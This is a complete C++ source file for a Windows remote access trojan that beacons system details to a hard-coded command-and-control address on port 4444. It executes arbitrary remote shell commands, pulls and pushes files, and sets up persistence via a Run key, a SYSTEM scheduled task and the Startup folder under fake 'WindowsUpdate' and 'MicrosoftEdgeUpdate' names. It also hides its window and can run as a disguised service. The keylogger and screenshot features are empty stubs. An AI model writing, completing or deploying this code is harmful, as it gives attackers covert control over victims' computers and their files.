#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <thread>
#include <vector>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <ctime>
#include <cstdlib>
#include <tlhelp32.h>
#include <psapi.h>
#include <shlobj.h>
#include <wininet.h>
#include <urlmon.h>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 4096
#define C2_SERVER "10.99.99.6"  // Cambiar por tu IP
#define C2_PORT 4444
#define BEACON_INTERVAL 30

class AgentCore {
private:
    SOCKET c2_socket;
    std::string agent_id;
    bool running;
    std::string os_version;
    std::string username;
    std::string hostname;
    std::string internal_ip;
    
public:
    AgentCore() : c2_socket(INVALID_SOCKET), running(false) {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        generate_agent_id();
        gather_system_info();
    }
    
    ~AgentCore() {
        if (c2_socket != INVALID_SOCKET) {
            closesocket(c2_socket);
        }
        WSACleanup();
    }
    
private:
    void generate_agent_id() {
        srand(time(nullptr));
        char id[17];
        const char charset[] = "0123456789ABCDEF";
        for (int i = 0; i < 16; i++) {
            id[i] = charset[rand() % (sizeof(charset) - 1)];
        }
        id[16] = '\0';
        agent_id = id;
    }
    
    void gather_system_info() {
        // Get OS version
        OSVERSIONINFOEX osInfo;
        osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
        GetVersionEx((OSVERSIONINFO*)&osInfo);
        
        os_version = "Windows ";
        os_version += std::to_string(osInfo.dwMajorVersion) + "." + 
                     std::to_string(osInfo.dwMinorVersion) + " Build " + 
                     std::to_string(osInfo.dwBuildNumber);
        
        // Get username
        char username_buffer[256];
        DWORD username_len = sizeof(username_buffer);
        GetUserNameA(username_buffer, &username_len);
        username = username_buffer;
        
        // Get hostname
        char hostname_buffer[256];
        DWORD hostname_len = sizeof(hostname_buffer);
        GetComputerNameA(hostname_buffer, &hostname_len);
        hostname = hostname_buffer;
        
        // Get internal IP
        char host[256];
        struct hostent* host_entry;
        gethostname(host, sizeof(host));
        host_entry = gethostbyname(host);
        internal_ip = inet_ntoa(*(struct in_addr*)*host_entry->h_addr_list);
    }
    
    std::string exec_command(const std::string& cmd) {
        char buffer[128];
        std::string result = "";
        FILE* pipe = _popen(cmd.c_str(), "r");
        if (!pipe) return "ERROR";
        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
            result += buffer;
        }
        _pclose(pipe);
        return result;
    }
    
    std::string read_file(const std::string& filename) {
        std::ifstream file(filename, std::ios::binary);
        if (!file) return "";
        
        std::string content((std::istreambuf_iterator<char>(file)),
                           std::istreambuf_iterator<char>());
        return content;
    }
    
    bool write_file(const std::string& filename, const std::string& content) {
        std::ofstream file(filename, std::ios::binary);
        if (!file) return false;
        file.write(content.c_str(), content.size());
        return true;
    }
    
    std::string base64_encode(const std::string& input) {
        static const std::string base64_chars = 
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "abcdefghijklmnopqrstuvwxyz"
            "0123456789+/";
            
        std::string encoded;
        int i = 0;
        int j = 0;
        unsigned char char_array_3[3];
        unsigned char char_array_4[4];
        
        for (const auto& c : input) {
            char_array_3[i++] = c;
            if (i == 3) {
                char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
                char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
                char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
                char_array_4[3] = char_array_3[2] & 0x3f;
                
                for (i = 0; i < 4; i++) encoded += base64_chars[char_array_4[i]];
                i = 0;
            }
        }
        
        if (i > 0) {
            for (j = i; j < 3; j++) char_array_3[j] = '\0';
            
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            
            for (j = 0; j < i + 1; j++) encoded += base64_chars[char_array_4[j]];
            
            while (i++ < 3) encoded += '=';
        }
        
        return encoded;
    }
    
    bool connect_to_c2() {
        c2_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (c2_socket == INVALID_SOCKET) {
            return false;
        }
        
        sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(C2_PORT);
        inet_pton(AF_INET, C2_SERVER, &server_addr.sin_addr);
        
        if (connect(c2_socket, (SOCKADDR*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
            closesocket(c2_socket);
            c2_socket = INVALID_SOCKET;
            return false;
        }
        
        // Send beacon registration
        std::string beacon = "BEACON|" + agent_id + "|" + os_version + "|" + 
                           username + "|" + hostname + "|" + internal_ip;
        send(c2_socket, beacon.c_str(), beacon.length(), 0);
        
        char response[256];
        int bytes_received = recv(c2_socket, response, sizeof(response) - 1, 0);
        if (bytes_received > 0) {
            response[bytes_received] = '\0';
            return std::string(response).find("REGISTERED") != std::string::npos;
        }
        
        return false;
    }
    
    void establish_persistence() {
        // Method 1: Registry Run Key
        HKEY hKey;
        RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                      0, KEY_WRITE, &hKey);
        
        char exe_path[MAX_PATH];
        GetModuleFileNameA(NULL, exe_path, MAX_PATH);
        RegSetValueExA(hKey, "WindowsUpdate", 0, REG_SZ, (BYTE*)exe_path, strlen(exe_path) + 1);
        RegCloseKey(hKey);
        
        // Method 2: Scheduled Task
        std::string task_cmd = "schtasks /create /tn \"MicrosoftEdgeUpdate\" /tr \\\"";
        task_cmd += exe_path;
        task_cmd += "\\\" /sc ONLOGON /ru SYSTEM /f";
        system(task_cmd.c_str());
        
        // Method 3: Startup Folder
        char startup_path[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path);
        std::string shortcut_path = std::string(startup_path) + "\\WindowsUpdate.lnk";
        
        // Create shortcut (would need COM for proper shortcut creation)
        std::string copy_cmd = "copy \"" + std::string(exe_path) + "\" \"" + 
                              std::string(startup_path) + "\\WindowsUpdate.exe\"";
        system(copy_cmd.c_str());
    }
    
    std::string take_screenshot() {
        // Implementación básica de screenshot
        // Nota: Para producción necesitarías GDI+
        return "[*] Screenshot functionality requires GDI+ implementation";
    }
    
    void start_keylogger() {
        // Keylogger implementation would go here
        // Note: Requires SetWindowsHookEx
    }
    
    void stop_keylogger() {
        // Stop keylogging
    }
    
public:
    void run() {
        running = true;
        
        while (running) {
            if (c2_socket == INVALID_SOCKET) {
                if (!connect_to_c2()) {
                    Sleep(BEACON_INTERVAL * 1000);
                    continue;
                }
            }
            
            // Send heartbeat
            send(c2_socket, "HEARTBEAT", 9, 0);
            
            // Check for commands
            char buffer[BUFFER_SIZE];
            int bytes_received = recv(c2_socket, buffer, BUFFER_SIZE - 1, 0);
            
            if (bytes_received > 0) {
                buffer[bytes_received] = '\0';
                std::string command(buffer);
                
                if (command == "PING") {
                    send(c2_socket, "PONG", 4, 0);
                }
                else if (command.find("CMD|") == 0) {
                    std::string cmd = command.substr(4);
                    std::string result = exec_command(cmd);
                    std::string response = "RESULT|" + result;
                    send(c2_socket, response.c_str(), response.length(), 0);
                }
                else if (command.find("DOWNLOAD|") == 0) {
                    std::string filename = command.substr(9);
                    std::string file_content = read_file(filename);
                    if (!file_content.empty()) {
                        std::string b64_content = base64_encode(file_content);
                        std::string response = "FILE|" + filename + "|" + b64_content;
                        send(c2_socket, response.c_str(), response.length(), 0);
                    } else {
                        send(c2_socket, "ERROR|File not found", 20, 0);
                    }
                }
                else if (command.find("UPLOAD|") == 0) {
                    size_t sep1 = command.find("|", 7);
                    size_t sep2 = command.find("|", sep1 + 1);
                    std::string filename = command.substr(7, sep1 - 7);
                    std::string b64_content = command.substr(sep1 + 1, sep2 - sep1 - 1);
                    
                    // Decode base64 (simplified - need proper base64 decode)
                    std::string content = b64_content; // Should decode
                    
                    if (write_file(filename, content)) {
                        send(c2_socket, "UPLOAD_SUCCESS", 14, 0);
                    } else {
                        send(c2_socket, "UPLOAD_FAILED", 13, 0);
                    }
                }
                else if (command == "PERSIST") {
                    establish_persistence();
                    send(c2_socket, "PERSISTENCE_ESTABLISHED", 23, 0);
                }
                else if (command == "SCREENSHOT") {
                    std::string screenshot = take_screenshot();
                    send(c2_socket, screenshot.c_str(), screenshot.length(), 0);
                }
                else if (command == "KEYLOGGER_START") {
                    start_keylogger();
                    send(c2_socket, "KEYLOGGER_STARTED", 17, 0);
                }
                else if (command == "KEYLOGGER_STOP") {
                    stop_keylogger();
                    send(c2_socket, "KEYLOGGER_STOPPED", 17, 0);
                }
                else if (command == "EXIT") {
                    running = false;
                    send(c2_socket, "AGENT_EXITING", 13, 0);
                }
            } else if (bytes_received == 0) {
                // Connection closed
                closesocket(c2_socket);
                c2_socket = INVALID_SOCKET;
            }
            
            Sleep(5000); // Wait 5 seconds between checks
        }
    }
};

// Windows Service functionality (for stealth)
#ifdef _WIN32
SERVICE_STATUS g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE g_ServiceStopEvent = INVALID_HANDLE_VALUE;

VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
VOID WINAPI ServiceCtrlHandler(DWORD);
DWORD WINAPI ServiceWorkerThread(LPVOID lpParam);

#define SERVICE_NAME "WindowsUpdateService"

int RunAsService() {
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        { (LPSTR)SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
        { NULL, NULL }
    };
    
    if (StartServiceCtrlDispatcher(ServiceTable) == FALSE) {
        return GetLastError();
    }
    
    return 0;
}

VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {
    g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
    
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;
    
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
    
    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
    
    HANDLE hThread = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);
    
    WaitForSingleObject(hThread, INFINITE);
    
    CloseHandle(g_ServiceStopEvent);
    
    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode) {
    switch (CtrlCode) {
        case SERVICE_CONTROL_STOP:
            if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
                break;
            
            g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
            SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
            
            SetEvent(g_ServiceStopEvent);
            break;
        default:
            break;
    }
}

DWORD WINAPI ServiceWorkerThread(LPVOID lpParam) {
    AgentCore agent;
    agent.run();
    return ERROR_SUCCESS;
}
#endif

// Main entry point
int main(int argc, char* argv[]) {
    // Check if running as service
    #ifdef _WIN32
    if (argc > 1 && strcmp(argv[1], "--service") == 0) {
        return RunAsService();
    }
    #endif
    
    // Hide console window if not debugging
    #ifdef _WIN32
    HWND hwnd = GetConsoleWindow();
    if (!(argc > 1 && strcmp(argv[1], "--debug") == 0)) {
        ShowWindow(hwnd, SW_HIDE);
    }
    #endif
    
    // Check if already running
    HANDLE hMutex = CreateMutexA(NULL, TRUE, "Global\\WindowsUpdateAgent");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return 0; // Already running
    }
    
    // Start agent
    AgentCore agent;
    
    // Establish persistence on first run
    static bool first_run = true;
    if (first_run) {
        agent.run(); // This will call establish_persistence() when PERSIST command received
        first_run = false;
    }
    
    agent.run();
    
    ReleaseMutex(hMutex);
    CloseHandle(hMutex);
    
    return 0;
}
